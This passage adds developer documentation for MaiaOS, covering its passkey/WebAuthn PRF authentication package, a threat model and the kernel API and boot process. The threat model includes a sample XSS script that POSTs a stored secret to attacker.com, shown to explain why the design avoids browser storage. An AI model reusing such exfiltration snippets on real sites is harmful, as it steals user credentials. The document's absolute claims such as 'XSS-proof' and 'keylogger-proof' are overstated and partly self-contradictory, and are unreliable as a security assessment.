+- Password unlocks a vault stored in browser storage
+- If someone steals the password, they get everything
+
+**MaiaOS with maia-self:**
+- Your fingerprint unlocks a hardware chip (Secure Enclave)
+- The chip generates secrets on-demand (never stored!)
+- Even if someone hacks your browser, there's nothing to steal
+
+**Analogy:**
+Imagine two ways to keep your diary safe:
+
+1. **Password-based:** Locked diary with a password you write down
+   - If someone finds the password, they read everything
+   - If you forget the password, you're locked out forever
+
+2. **MaiaOS (passkey-based):** Magic diary that only opens with your fingerprint
+   - No password to steal or forget
+   - Only YOUR fingerprint works (can't be tricked)
+   - Magic happens in a special chip that hackers can't reach
+
+---
+
+## Architecture
+
+### The Secret Hierarchy
+
+```
+┌─────────────────────────────────────────┐
+│ Layer 1: PRF Output (32 bytes)         │
+│ Source: WebAuthn PRF in Secure Enclave │
+│ Storage: NEVER stored, derived on-demand│
+└─────────────────────────────────────────┘
+              ↓ crypto.agentSecretFromSecretSeed()
+┌─────────────────────────────────────────┐
+│ Layer 2: AgentSecret                    │
+│ Format: "sealerSecret_z.../signer..."   │
+│ Storage: NEVER stored, ephemeral         │
+└─────────────────────────────────────────┘
+              ↓ crypto.getAgentID()
+┌─────────────────────────────────────────┐
+│ Layer 3: AgentID                        │
+│ Format: "sealer_z.../signer_z..."      │
+│ Purpose: Public cryptographic identity  │
+└─────────────────────────────────────────┘
+              ↓ accountHeaderForInitialAgentSecret() + idforHeader()
+┌─────────────────────────────────────────┐
+│ Layer 4: AccountID (DETERMINISTIC!)     │
+│ Format: "co_z..."                       │
+│ Storage: Public (can be stored)         │
+└─────────────────────────────────────────┘
+```
+
+**Key Insight:** AccountID is deterministic! Same passkey + salt → same accountID (always!)
+
+### Storage Architecture
+
+```
+┌─────────────────────────────────────────┐
+│ Passkey (Hardware-Backed)               │
+│ Storage: Secure Enclave / TPM            │
+│ Content: Private key (never leaves HW)  │
+│ Access: Biometric/PIN required           │
+└─────────────────────────────────────────┘
+              ↓
+┌─────────────────────────────────────────┐
+│ IndexedDB (Local Cache)                  │
+│ Storage: Browser IndexedDB               │
+│ Content: CoValue data (encrypted)        │
+│ Purpose: Fast offline access             │
+└─────────────────────────────────────────┘
+              ↓
+┌─────────────────────────────────────────┐
+│ Jazz Cloud (Cross-Device Sync)          │
+│ Storage: Jazz Cloud server               │
+│ Content: CoValue data (end-to-end enc)   │
+│ Purpose: Sync across devices             │
+└─────────────────────────────────────────┘
+```
+
+**Zero Browser Storage:**
+- ❌ NO secrets in localStorage
+- ❌ NO secrets in sessionStorage
+- ❌ NO secrets in IndexedDB (only encrypted CoValue data)
+- ✅ Everything derived on-demand from passkey
+
+---
+
+## Documentation Structure
+
+This package documentation is organized into focused topics:
+
+- **[security-analysis.md](./security-analysis.md)** - Overall security analysis and threat model
+- **[auth-flows.md](./auth-flows.md)** - Registration and login flows
+- **[cryptography.md](./cryptography.md)** - Bottom-up cryptography concepts
+- **[api-reference.md](./api-reference.md)** - Complete API reference
+
+---
+
+## Quick Start
+
+### Sign Up (Create New Account)
+
+```javascript
+import { signUpWithPasskey } from '@MaiaOS/self';
+
+const { accountID, agentSecret, node, account } = await signUpWithPasskey({
+  name: "maia",
+  salt: "maia.city"
+});
+
+// accountID: "co_z..." (public identifier)
+// agentSecret: Ephemeral (never store!)
+// node: LocalNode instance (active session)
+```
+
+### Sign In (Use Existing Passkey)
+
+```javascript
+import { signInWithPasskey } from '@MaiaOS/self';
+
+const { accountID, agentSecret, node, account } = await signInWithPasskey({
+  salt: "maia.city"
+});
+
+// ⚡ Only 1 biometric prompt!
+// Everything computed deterministically from passkey
+```
+
+---
+
+## Key Concepts
+
+### Hardware-Backed Secrets
+
+**What it means:**
+- PRF evaluation happens in Secure Enclave/TPM (hardware chip)
+- Secrets never computed in JavaScript
+- Cannot be extracted by XSS attacks or malware
+
+**Why it matters:**
+- Even if your browser is compromised, secrets are safe
+- Hardware isolation provides stronger security than software-only solutions
+
+### Deterministic Account Recovery
+
+**What it means:**
+- Same passkey + same salt → always same accountID
+- No random fields in account headers (createdAt: null, uniqueness: null)
+- AccountID computed before account creation
+
+**Why it matters:**
+- Cross-device recovery without server-side account storage
+- No "forgot password" flow needed
+- User controls their identity (self-sovereign)
+
+### Zero Browser Storage
+
+**What it means:**
+- No secrets stored in localStorage, sessionStorage, or IndexedDB
+- All secrets derived on-demand from passkey
+- Only public data (accountID) can be stored
+
+**Why it matters:**
+- XSS attacks cannot steal secrets (nothing to steal!)
+- Device theft mitigated (requires biometric)
+- No localStorage compromise risk
+
+---
+
+## Browser Support
+
+### ✅ Supported
+
+- Chrome on macOS, Linux, Windows 11
+- Safari on macOS 13+, iOS 16+
+
+### ❌ NOT Supported
+
+- Firefox (all platforms)
+- Windows 10 (any browser)
+- Old browsers
+
+**The package will throw an error on unsupported browsers with instructions.**
+
+---
+
+## Related Documentation
+
+- [maia-kernel Package](../02_maia-kernel/README.md) - Boot process and orchestration
+- [Security Improvements](../architecture/security-improvements.md) - Security analysis
+- [Auth Secrets](../architecture/auth-secrets.md) - Secret hierarchy details
+- [CoJSON Integration](../architecture/cojson.md) - Database layer
+
+---
+
+## Source Files
+
+**Package:** `libs/maia-self/`
+
+**Key Files:**
+- `src/index.js` - Public API exports
+- `src/oSSI.js` - Sign up & sign in logic
+- `src/prf-evaluator.js` - WebAuthn PRF interface
+- `src/feature-detection.js` - PRF support detection
+- `src/storage.js` - IndexedDB helper (for CoValue data)
+- `src/utils.js` - Encoding/validation utilities
+
+**Dependencies:**
+- `cojson` - Core CRDT library
+- `cojson-storage-indexeddb` - IndexedDB storage
+- `cojson-transport-ws` - WebSocket transport for Jazz Cloud
+
+---
+
+# MAIA SELF/SECURITY ANALYSIS
+
+*Source: developers/01_maia-self/security-analysis.md*
+
+# Security Analysis
+
+Comprehensive security analysis of `@MaiaOS/self` authentication system.
+
+---
+
+## Overview
+
+`@MaiaOS/self` provides hardware-backed, zero-storage authentication that is **more secure** than traditional password-based systems and browser extension password managers.
+
+**Key Security Properties:**
+- ✅ **Hardware-backed secrets** - PRF evaluation in Secure Enclave/TPM
+- ✅ **Zero browser storage** - No secrets in localStorage/sessionStorage
+- ✅ **XSS-proof** - No secrets accessible to JavaScript
+- ✅ **Phishing-resistant** - Domain-bound credentials (WebAuthn)
+- ✅ **Keylogger-proof** - No keyboard input (biometric only)
+
+---
+
+## Threat Model
+
+### Attack Vectors
+
+#### 1. XSS (Cross-Site Scripting)
+
+**What is it:** Malicious website injects code to steal secrets.
+
+**Traditional Approach:**
+- Secrets stored in localStorage
+- XSS attack reads localStorage → full account access
+
+**MaiaOS:**
+- ✅ **Zero secrets in browser storage**
+- ✅ Secrets derived in Secure Enclave (hardware-isolated)
+- ✅ XSS cannot access passkey (requires biometric/PIN)
+
+**Result:** ✅ XSS attack fails (nothing to steal)
+
+---
+
+#### 2. Malicious Browser Extension
+
+**What is it:** Fake or compromised extension spies on you.
+
+**Traditional Approach:**
+- Extensions can read other extensions' data
+- Malicious extension captures master password
+- Full account compromise
+
+**MaiaOS:**
+- ✅ **No extension required** - Web app only
+- ✅ Malicious extensions cannot access Secure Enclave
+- ✅ Hardware isolation protects secrets
+
+**Result:** ✅ Extension attacks mitigated (no extension attack surface)
+
+---
+
+#### 3. Phishing
+
+**What is it:** Fake website tricks you into revealing password.
+
+**Traditional Approach:**
+- User enters password on fake site
+- Attacker captures password → full access
+
+**MaiaOS:**
+- ✅ **No password to phish** - Biometric only
+- ✅ Passkeys are domain-bound (only work on real site)
+- ✅ Fake site cannot trick biometric sensor
+
+**Result:** ✅ Phishing attack fails (no password to steal)
+
+---
+
+#### 4. Keylogger (Spyware)
+
+**What is it:** Malware records every key you press.
+
+**Traditional Approach:**
+- Keylogger captures master password
+- Attacker has full account access
+
+**MaiaOS:**
+- ✅ **No keyboard input** - Biometric only
+- ✅ Keylogger cannot capture fingerprint/face
+- ✅ PRF evaluation in hardware (keylogger can't see it)
+
+**Result:** ✅ Keylogger attack fails (no keyboard input)
+
+---
+
+#### 5. Memory Dump Attack
+
+**What is it:** Malware reads computer memory to find secrets.
+
+**Traditional Approach:**
+- Decrypted passwords sit in RAM
+- Memory dump reveals everything
+
+**MaiaOS:**
+- ✅ PRF output sits in RAM **temporarily**
+- ✅ Secrets cleared immediately after use
+- ✅ Secure Enclave protects PRF evaluation
+- ✅ Ephemeral secrets (derived on-demand)
+
+**Result:** ✅ Memory dump mitigated (secrets cleared, hardware-protected)
+
+---
+
+#### 6. Device Theft
+
+**What is it:** Someone steals your device and tries to access your account.
+
+**Traditional Approach:**
+- Secrets in localStorage → attacker has access
+- Needs master password (but might be weak)
+
+**MaiaOS:**
+- ✅ Passkey in Secure Enclave (hardware-isolated)
+- ✅ Cannot extract without biometric/PIN
+- ✅ Hardware rate-limiting prevents brute force
+
+**Result:** ✅ Device theft mitigated (hardware protection)
+
+---
+
+#### 7. Server Breach
+
+**What is it:** Hackers break into the sync server.
+
+**Traditional Approach:**
+- Encrypted vaults stored on server
+- Weak master passwords can be cracked
+- Future quantum computers might break encryption
+
+**MaiaOS:**
+- ✅ **Master secret NEVER stored anywhere**
+- ✅ Even if Jazz server is hacked, secrets are in hardware
+- ✅ Zero-knowledge sync (server cannot decrypt)
+
+**Result:** ✅ Server breach mitigated (master secret never leaves device)
+
+---
+
+## Security Comparison
+
+### MaiaOS vs Browser Extension Password Manager
+
+| Attack Vector | Browser Extension | MaiaOS | Winner |
+|---------------|-------------------|--------|--------|
+| XSS | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
+| Malicious Extensions | 🔴 High | 🟢 Low | 🏆 MaiaOS |
+| Phishing | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
+| Keylogger | 🔴 High | 🟢 Zero | 🏆 MaiaOS |
+| Memory Dump | 🔴 High | 🟢 Low | 🏆 MaiaOS |
+| Device Theft | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
+| Server Breach | 🟡 Medium | 🟢 Low | 🏆 MaiaOS |
+
+**Final Score:** MaiaOS wins **7 out of 7** attack vectors! 🎉
+
+---
+
+## Why MaiaOS is More Secure
+
+### 1. Hardware-Backed Secrets
+
+**Traditional:**
+- Secrets generated in JavaScript (software)
+- Stored in browser storage (software)
+- Accessible to any JavaScript code
+
+**MaiaOS:**
+- PRF evaluation in Secure Enclave/TPM (hardware)
+- Secrets never leave hardware during derivation
+- Accessible only with biometric/PIN
+
+**Security Benefit:**
+- ✅ Cannot be extracted by XSS attacks
+- ✅ Cannot be logged or sent to error tracking
+- ✅ Cannot be stolen from memory dumps
+
+---
+
+### 2. Zero Browser Storage
+
+**Traditional:**
+- Must store secrets in localStorage/sessionStorage
+- Must store accountID for recovery
+- Vulnerable to XSS attacks
+
+**MaiaOS:**
+- ✅ Zero secrets in JavaScript (hardware only)
+- ✅ Zero accountID in browser storage (computed on-demand)
+- ✅ Zero metadata (no "isLoggedIn" flags)
+- ✅ XSS cannot access passkey (requires biometric/PIN)
+
+**Security Benefit:**
+- ✅ XSS attacks cannot steal secrets
+- ✅ Cannot be extracted from browser DevTools
+- ✅ Cannot be copied to clipboard
+- ✅ Cannot be logged by extensions
+
+---
+
+### 3. Deterministic Account Recovery
+
+**Traditional:**
+- Random secret → accountID unknown until account created
+- Must store accountID to recover account
+
+**MaiaOS:**
+- PRF (deterministic) → accountID **computable before creation!**
+- Same passkey + salt → always same accountID
+
+**Security Benefit:**
+- ✅ Cross-device recovery without server-side account storage
+- ✅ No "forgot password" flow needed
+- ✅ No password reset vulnerabilities
+- ✅ User controls their identity (self-sovereign)
+
+---
+
+### 4. No Extension Attack Surface
+
+**Traditional:**
+- Extension runs in browser
+- Malicious extensions can spy
+- Extension vulnerabilities
+
+**MaiaOS:**
+- ✅ No extension = no extension vulnerabilities
+- ✅ Malicious extensions cannot spy on you
+- ✅ One less thing to attack
+
+---
+
+## Security Properties
+
+### What We Achieve
+
+#### 1. Hardware-Backed Secrets (Secure Enclave/TPM)
+
+```javascript
+// PRF evaluation happens in hardware!
+const { prfOutput } = await createPasskeyWithPRF({
+  name: "maia",
+  userId: randomBytes(32),
+  salt: stringToUint8Array("maia.city")
+});
+
+// prfOutput NEVER computed in JavaScript
+// Evaluation isolated in Secure Enclave/TPM
+// Requires biometric/PIN for every access
+```
+
+**Security benefit:**
+- ✅ Secrets never in JavaScript memory (hardware-isolated)
+- ✅ Cannot be extracted by XSS attacks
+- ✅ Cannot be logged or sent to error tracking
+- ✅ Cannot be stolen from memory dumps
+
+---
+
+#### 2. Zero Browser Storage (XSS-Proof)
+
+```javascript
+// NO secrets in localStorage
+localStorage.getItem('accountSecret'); // → null
+
+// NO secrets in sessionStorage
+sessionStorage.getItem('accountSecret'); // → null
+
+// NO secrets in IndexedDB (only public CoValue data)
+// NO secrets in cookies
+// NO secrets anywhere in browser!
+```
+
+**Security benefit:**
+- ✅ XSS attacks cannot steal secrets
+- ✅ Cannot be extracted from browser DevTools
+- ✅ Cannot be copied to clipboard
+- ✅ Cannot be logged by extensions
+
+---
+
+#### 3. Deterministic Account Recovery
+
+```javascript
+// Same passkey + same salt → ALWAYS same account
+const passkey1 = await signUpWithPasskey({ name: "alice", salt: "maia.city" });
+// → accountID: "co_zABC..."
+
+// Later, on different device with same passkey:
+const passkey2 = await signInWithPasskey({ salt: "maia.city" });
+// → accountID: "co_zABC..." (SAME!)
+
+// This is deterministic because:
+// 1. PRF(passkey, salt) → always same prfOutput
+// 2. prfOutput → always same agentSecret
+// 3. agentSecret → always same accountID (no random fields!)
+```
+
+**Security benefit:**
+- ✅ Cross-device recovery without server-side account storage
+- ✅ No "forgot password" flow needed
+- ✅ No password reset vulnerabilities
+- ✅ User controls their identity (self-sovereign)
+
+---
+
+#### 4. End-to-End Encryption (Jazz Cloud Cannot Read)
+
+```javascript
+// All CoValue data is encrypted with keys only you control
+const node = await LocalNode.withNewlyCreatedAccount({
+  crypto,
+  initialAgentSecret: agentSecret, // Only you have this!
+  peers: [jazzSyncPeer],           // Jazz Cloud sync
+  storage: indexedDBStorage
+});
+
+// Jazz Cloud stores encrypted transactions
+// Server cannot decrypt content
+// Only devices with your agentSecret can read data
+```
+
+**Security benefit:**
+- ✅ Zero-knowledge sync (server cannot read your data)
+- ✅ No "data breach" risk (server has encrypted blobs only)
+- ✅ No trust required in sync provider
+- ✅ You control encryption keys (not the server)
+
+---
+
+## Attack Surface Analysis
+
+### XSS Attack (Cross-Site Scripting)
+
+**Traditional Approach:**
+```javascript
+// Attacker injects:
+<script>
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: localStorage.getItem('accountSecret') // ❌ Full access!
+  });
+</script>
+```
+
+**MaiaOS:**
+```javascript
+// Attacker tries:
+<script>
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: localStorage.getItem('accountSecret') // → null (not stored!)
+  });
+</script>
+
+// To access passkey, attacker would need:
+// 1. User's biometric (impossible to steal via XSS)
+// 2. User's PIN (impossible to steal via XSS)
+// 3. Physical access to device (not via XSS)
+```
+
+**Result:** ✅ XSS attack fails (no secrets to steal)
+
+---
+
+### Device Theft
+
+**Traditional Approach:**
+- Attacker steals device
+- Extracts localStorage secrets
+- Full account access (no biometric required)
+
+**MaiaOS:**
+- Attacker steals device
+- Passkey in Secure Enclave (hardware-isolated)
+- Cannot extract without biometric/PIN
+- Cannot brute-force (hardware rate-limiting)
+
+**Result:** ✅ Device theft mitigated (hardware protection)
+
+---
+
+### Phishing Attack
+
+**Traditional Approach:**
+- Attacker creates fake login page
+- User enters password
+- Attacker captures password → Full access
+
+**MaiaOS:**
+- Attacker creates fake login page
+- User clicks "Sign in with passkey"
+- WebAuthn verifies domain → Passkey only works on real domain
+- Attacker cannot capture passkey
+
+**Result:** ✅ Phishing attack fails (domain-bound credentials)
+
+---
+
+## Implementation Requirements
+
+### DO ✅
+
+1. **Always use PRF** (strict mode, no fallbacks)
+2. **Never log secrets** to console or error tracking
+3. **Use HTTPS only** (passkeys require secure context)
+4. **Validate accountID computation** (verify match after creation)
+5. **Trust hardware** (let Secure Enclave/TPM do its job)
+6. **Default salt: "maia.city"** (consistent for deterministic recovery)
+
+### DON'T ❌
+
+1. **Never store secrets in browser storage** (localStorage, sessionStorage, IndexedDB)
+2. **Never store accountID in browser storage** (compute on-demand)
+3. **Never create backwards-compatible fallbacks** (PRF or nothing!)
+4. **Never bypass biometric/PIN** (hardware protection is our security model)
+5. **Never log prfOutput** (treat as master password)
+6. **Never send secrets to server** (even encrypted - unnecessary!)
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [auth-flows.md](./auth-flows.md) - Registration and login flows
+- [cryptography.md](./cryptography.md) - Bottom-up cryptography concepts
+- [api-reference.md](./api-reference.md) - API reference
+- [Security Improvements](../architecture/security-improvements.md) - Detailed security analysis
+
+---
+
+# MAIA KERNEL/API REFERENCE
+
+*Source: developers/02_maia-kernel/api-reference.md*
+
+# API Reference
+
+Complete API reference for `@MaiaOS/kernel` package.
+
+---
+
+## `createMaiaOS(options)`
+
+Creates an authenticated MaiaOS instance (identity layer).
+
+**Parameters:**
+- `options.node` (required) - LocalNode instance from `signInWithPasskey`
+- `options.account` (required) - RawAccount instance from `signInWithPasskey`
+- `options.accountID` (optional) - Account ID string
+- `options.name` (optional) - Display name
+
+**Returns:** `Promise<Object>` - MaiaOS instance with:
+- `id` - Identity object (`{ maiaId, node }`)
+- `auth` - Authentication API
+- `db` - Database API (future)
+- `script` - DSL API (future)
+- `inspector()` - Dev tool to inspect account
+- `getAllCoValues()` - List all CoValues
+- `getCoValueDetail(coId)` - Get CoValue details
+
+**Throws:** If `node` or `account` not provided
+
+**Example:**
+```javascript
+const { node, account } = await signInWithPasskey({ salt: "maia.city" });
+const o = await createMaiaOS({ node, account });
+
+// Inspect your account
+const accountData = o.inspector();
+console.log("Account data:", accountData);
+
+// List all CoValues
+const coValues = o.getAllCoValues();
+console.log("CoValues:", coValues);
+```
+
+---
+
+## `MaiaOS.boot(config)`
+
+Boots the MaiaOS operating system (execution layer).
+
+**Parameters:**
+- `config.modules` (optional, default: `['db', 'core', 'dragdrop', 'interface']`) - Modules to load
+- `config.registry` (optional) - Config registry for seeding database
+- `config.isDevelopment` (optional) - Development mode flag
+
+**Returns:** `Promise<MaiaOS>` - Booted OS instance
+
+**Example:**
+```javascript
+const os = await MaiaOS.boot({
+  modules: ['db', 'core', 'dragdrop', 'interface'],
+  registry: {
+    // Your configs here
+  }
+});
+```
+
+---
+
+## `os.createActor(actorPath, container)`
+
+Creates an actor from a `.maia` file.
+
+**Parameters:**
+- `actorPath` (string) - Path to actor file or co-id
+- `container` (HTMLElement) - DOM container for actor
+
+**Returns:** `Promise<Object>` - Created actor instance
+
+**Example:**
+```javascript
+const actor = await os.createActor(
+  './actors/todo.actor.maia',
+  document.getElementById('todo-container')
+);
+```
+
+---
+
+## `os.loadVibe(vibePath, container)`
+
+Loads a vibe (app manifest) from a file.
+
+**Parameters:**
+- `vibePath` (string) - Path to `.vibe.maia` file
+- `container` (HTMLElement) - DOM container for root actor
+
+**Returns:** `Promise<{vibe: Object, actor: Object}>` - Vibe metadata and actor
+
+**Example:**
+```javascript
+const { vibe, actor } = await os.loadVibe(
+  './vibes/todos/manifest.vibe.maia',
+  document.getElementById('app-container')
+);
+```
+
+---
+
+## `os.loadVibeFromDatabase(vibeId, container)`
+
+Loads a vibe from the database.
+
+**Parameters:**
+- `vibeId` (string) - Vibe ID (e.g., `"@vibe/todos"`)
+- `container` (HTMLElement) - DOM container for root actor
+
+**Returns:** `Promise<{vibe: Object, actor: Object}>` - Vibe metadata and actor
+
+**Example:**
+```javascript
+const { vibe, actor } = await os.loadVibeFromDatabase(
+  '@vibe/todos',
+  document.getElementById('app-container')
+);
+```
+
+---
+
+## `os.getActor(actorId)`
+
+Gets an actor by ID.
+
+**Parameters:**
+- `actorId` (string) - Actor ID
+
+**Returns:** `Object|null` - Actor instance or null
+
+---
+
+## `os.sendMessage(actorId, message)`
+
+Sends a message to an actor.
+
+**Parameters:**
+- `actorId` (string) - Target actor ID
+- `message` (Object) - Message object
+
+**Example:**
+```javascript
+os.sendMessage('actor-123', {
+  type: 'click',
+  target: 'button-1'
+});
+```
+
+---
+
+## `os.db(payload)`
+
+Executes a database operation (internal use + `@db` tool).
+
+**Parameters:**
+- `payload` (Object) - Operation payload:
+  - `op` (string) - Operation type: `'query'`, `'create'`, `'update'`, `'delete'`, `'seed'`
+  - Other fields depend on operation type
+
+**Returns:** `Promise<any>` - Operation result
+
+**Example:**
+```javascript
+// Query
+const todos = await os.db({
+  op: 'query',
+  schema: '@schema/todos',
+  filter: { completed: false }
+});
+
+// Create
+const newTodo = await os.db({
+  op: 'create',
+  schema: '@schema/todos',
+  data: { text: 'Buy milk', completed: false }
+});
+```
+
+---
+
+## `os.getEngines()`
+
+Gets all engines for debugging.
+
+**Returns:** `Object` - Engine instances:
+- `actorEngine` - ActorEngine
+- `viewEngine` - ViewEngine
+- `styleEngine` - StyleEngine
+- `stateEngine` - StateEngine
+- `toolEngine` - ToolEngine
+- `dbEngine` - DBEngine
+- `evaluator` - MaiaScriptEvaluator
+- `moduleRegistry` - ModuleRegistry
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [auth-layer.md](./auth-layer.md) - Identity & Authentication layer
+- [boot-process.md](./boot-process.md) - Boot process details
+- [patterns.md](./patterns.md) - Common patterns
+
+---
+
+# MAIA KERNEL/AUTH LAYER
+
+*Source: developers/02_maia-kernel/auth-layer.md*
+
+# Identity & Authentication Layer
+
+The `createMaiaOS` function provides the identity and authentication layer of MaiaOS.
+
+---
+
+## Overview
+
+**What it is:** Proves who you are and gives you access to your account.
+
+**When to use:** Before booting the OS, you need to authenticate.
+
+---
+
+## Usage
+
+```javascript
+import { createMaiaOS } from '@MaiaOS/kernel';
+import { signInWithPasskey } from '@MaiaOS/self';
+
+// Step 1: Authenticate (get your ID card)
+const { node, account, accountID } = await signInWithPasskey({
+  salt: "maia.city"
+});
+
+// Step 2: Create MaiaOS instance (prove you're authenticated)
+const o = await createMaiaOS({ node, account, accountID });
+```
+
+---
+
+## What You Get
+
+After calling `createMaiaOS`, you receive an authenticated MaiaOS instance with:
+
+### `o.id`
+
+Your account identity object containing:
+- `maiaId` - Your MaiaID (unique identifier)
+- `node` - LocalNode instance for CoJSON operations
+
+### `o.auth`
+
+Authentication management API for:
+- Managing authentication state
+- Signing in/out
+- Account management
+
+### `o.inspector()`
+
+Dev tool to inspect your account data:
+
+```javascript
+const accountData = o.inspector();
+console.log("Account data:", accountData);
+```
+
+### `o.getAllCoValues()`
+
+List all CoValues in your account:
+
+```javascript
+const coValues = o.getAllCoValues();
+console.log("CoValues:", coValues);
+```
+
+### `o.getCoValueDetail(coId)`
+
+Get details about a specific CoValue:
+
+```javascript
+const detail = o.getCoValueDetail('co_z...');
+console.log("CoValue detail:", detail);
+```
+
+---
+
+## API Reference
+
+### `createMaiaOS(options)`
+
+Creates an authenticated MaiaOS instance (identity layer).
+
+**Parameters:**
+- `options.node` (required) - LocalNode instance from `signInWithPasskey`
+- `options.account` (required) - RawAccount instance from `signInWithPasskey`
+- `options.accountID` (optional) - Account ID string
+- `options.name` (optional) - Display name
+
+**Returns:** `Promise<Object>` - MaiaOS instance with:
+- `id` - Identity object (`{ maiaId, node }`)
+- `auth` - Authentication API
+- `db` - Database API (future)
+- `script` - DSL API (future)
+- `inspector()` - Dev tool to inspect account
+- `getAllCoValues()` - List all CoValues
+- `getCoValueDetail(coId)` - Get CoValue details
+
+**Throws:** If `node` or `account` not provided
+
+**Example:**
+```javascript
+const { node, account } = await signInWithPasskey({ salt: "maia.city" });
+const o = await createMaiaOS({ node, account });
+
+// Inspect your account
+const accountData = o.inspector();
+console.log("Account data:", accountData);
+
+// List all CoValues
+const coValues = o.getAllCoValues();
+console.log("CoValues:", coValues);
+```
+
+---
+
+## Key Concepts
+
+### Identity vs. Execution
+
+**Identity Layer (`createMaiaOS`):**
+- **Purpose:** Prove who you are
+- **When:** Before booting
+- **What it gives:** Access to your account, CoValues, identity
+- **Dependencies:** `@MaiaOS/self` (authentication)
+
+**Execution Layer (`MaiaOS.boot()`):**
+- **Purpose:** Run your app
+- **When:** After authentication
+- **What it gives:** Engines, actors, DSL execution
+- **Dependencies:** `@MaiaOS/script`, `@MaiaOS/db`, `@MaiaOS/schemata`
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [boot-process.md](./boot-process.md) - Execution layer
+- [api-reference.md](./api-reference.md) - Complete API reference
+- [patterns.md](./patterns.md) - Common patterns
+
+---
+
+# MAIA KERNEL/BOOT PROCESS
+
+*Source: developers/02_maia-kernel/boot-process.md*
+
+# Boot Process and Execution Layer
+
+The `MaiaOS.boot()` function initializes the entire MaiaOS operating system with all engines and modules.
+
+---
+
+## Overview
+
+**What it is:** Starts all the engines that run your actors and execute MaiaScript.
+
+**When to use:** After authentication, boot the OS to run your app.
+
+---
+
+## Usage
+
+```javascript
+import { MaiaOS } from '@MaiaOS/kernel';
+
+// Boot the operating system
+const os = await MaiaOS.boot({
+  modules: ['db', 'core', 'dragdrop', 'interface'],
+  registry: { /* configs */ }
+});
+
+// Now you can:
+// - os.createActor() - Create actors
+// - os.loadVibe() - Load app manifests
+// - os.sendMessage() - Send messages between actors
+```
+
+---
+
+## Boot Process Deep Dive
+
+When you call `MaiaOS.boot()`, here's what happens:
+
+```
+1. Initialize Database
+   └─> Creates IndexedDBBackend
+   └─> Creates DBEngine
+
+2. Seed Database (if registry provided)
+   └─> Collects schemas from @MaiaOS/schemata
+   └─> Validates schemas against meta schema
+   └─> Seeds configs, schemas, and tool definitions
+   └─> Sets up schema resolver
+
+3. Initialize Engines
+   └─> ModuleRegistry (module loader)
+   └─> MaiaScriptEvaluator (DSL evaluator)
+   └─> ToolEngine (tool executor)
+   └─> StateEngine (state machine interpreter)
+   └─> StyleEngine (style compiler)
+   └─> ViewEngine (view renderer)
+   └─> ActorEngine (actor lifecycle)
+   └─> SubscriptionEngine (reactive subscriptions)
+   └─> DBEngine (database operations)
+
+4. Wire Dependencies
+   └─> Pass engines to each other
+   └─> Set up circular references
+   └─> Store engines in registry
+
+5. Load Modules
+   └─> Loads specified modules (db, core, dragdrop, interface)
+   └─> Each module registers its tools
+   └─> Tools become available for use
+
+6. Return OS Instance
+   └─> Ready to create actors and run apps!
+```
+
+---
+
+## Engine Initialization Order
+
+Engines are initialized in a specific order due to dependencies:
+
+```
+1. ModuleRegistry (no dependencies)
+2. MaiaScriptEvaluator (needs ModuleRegistry)
+3. ToolEngine (needs ModuleRegistry)
+4. StateEngine (needs ToolEngine, Evaluator)
+5. StyleEngine (no dependencies)
+6. ViewEngine (needs Evaluator, ModuleRegistry)
+7. ActorEngine (needs StyleEngine, ViewEngine, ModuleRegistry, ToolEngine, StateEngine)
+8. SubscriptionEngine (needs DBEngine, ActorEngine)
+```
+
+---
+
+## Module System
+
+Modules are dynamically loaded during boot. Each module:
+1. Registers tools with `ToolEngine`
+2. Provides module-specific functionality
+3. Can access engines via `ModuleRegistry`
+
+**Available Modules:**
+- `db` - Database operations (`@db` tool)
+- `core` - Core UI utilities (`@core/*` tools)
+- `dragdrop` - Drag and drop (`@dragdrop/*` tools)
+- `interface` - Interface tools (`@interface/*` tools)
+
+---
+
+## Database Seeding
+
+When you provide a `registry` in boot config:
+1. Schemas are collected from `@MaiaOS/schemata`
+2. Schemas are validated against meta schema
+3. Configs, schemas, and tool definitions are seeded
+4. Schema resolver is set up for runtime schema loading
+
+---
+
+## What You Get
+
+After booting, you receive a MaiaOS instance with:
+
+### `os.createActor(actorPath, container)`
+
+Creates an actor from a `.maia` file.
+
+**Parameters:**
+- `actorPath` (string) - Path to actor file or co-id
+- `container` (HTMLElement) - DOM container for actor
+
+**Returns:** `Promise<Object>` - Created actor instance
+
+### `os.loadVibe(vibePath, container)`
+
+Loads a vibe (app manifest) from a file.
+
+**Parameters:**
+- `vibePath` (string) - Path to `.vibe.maia` file
+- `container` (HTMLElement) - DOM container for root actor
+
+**Returns:** `Promise<{vibe: Object, actor: Object}>` - Vibe metadata and actor
+
+### `os.loadVibeFromDatabase(vibeId, container)`
+
+Loads a vibe from the database.
+
+**Parameters:**
+- `vibeId` (string) - Vibe ID (e.g., `"@vibe/todos"`)
+- `container` (HTMLElement) - DOM container for root actor
+
+**Returns:** `Promise<{vibe: Object, actor: Object}>` - Vibe metadata and actor
+
+### `os.getActor(actorId)`
+
+Gets an actor by ID.
+
+**Parameters:**
+- `actorId` (string) - Actor ID
+
+**Returns:** `Object|null` - Actor instance or null
+
+### `os.sendMessage(actorId, message)`
+
+Sends a message to an actor.
+
+**Parameters:**
+- `actorId` (string) - Target actor ID
+- `message` (Object) - Message object
+
+### `os.db(payload)`
+
+Executes a database operation (internal use + `@db` tool).
+
+**Parameters:**
+- `payload` (Object) - Operation payload:
+  - `op` (string) - Operation type: `'query'`, `'create'`, `'update'`, `'delete'`, `'seed'`
+  - Other fields depend on operation type
+
+**Returns:** `Promise<any>` - Operation result
+
+### `os.getEngines()`
+
+Gets all engines for debugging.
+
+**Returns:** `Object` - Engine instances:
+- `actorEngine` - ActorEngine
+- `viewEngine` - ViewEngine
+- `styleEngine` - StyleEngine
+- `stateEngine` - StateEngine
+- `toolEngine` - ToolEngine
+- `dbEngine` - DBEngine
+- `evaluator` - MaiaScriptEvaluator
+- `moduleRegistry` - ModuleRegistry
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [auth-layer.md](./auth-layer.md) - Identity & Authentication layer
+- [api-reference.md](./api-reference.md) - Complete API reference
+- [patterns.md](./patterns.md) - Common patterns
+
+---
+
+# MAIA KERNEL/PATTERNS
+
